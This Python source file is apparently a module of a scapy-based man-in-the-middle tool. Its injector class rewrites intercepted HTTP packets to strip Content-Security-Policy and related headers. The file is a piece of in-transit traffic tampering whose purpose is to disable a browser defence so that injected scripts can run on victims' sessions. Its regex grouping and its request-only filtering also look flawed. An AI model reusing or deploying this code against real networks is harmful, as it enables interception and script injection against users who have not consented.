import re

from scapy.layers.inet import TCP
from scapy.layers.l2 import Ether

from PacketHandler.Filters.http_request_filter import HttpRequestFilter
from PacketHandler.Injectors.abstract_injector import AbstractInjector


class ContentSecurityPolicySubstituter(AbstractInjector):

    def __init__(self):
        super(ContentSecurityPolicySubstituter, self).__init__()
        self._filter = HttpRequestFilter()

    def inject(self, packet):
        # type: (Ether) -> Ether or None
        if not self._filter.is_filtered(packet):
            return

        payload = str(packet[TCP].payload)
        new_payload = re.sub('\r\n((X-)?Content-Security-Policy)|(X-WebKit-CSP): [^(\r\n)]*', '\r\n', payload, 0, re.IGNORECASE)

        if payload != new_payload:
            return self.replace_packet_tcp_payload(packet, new_payload)
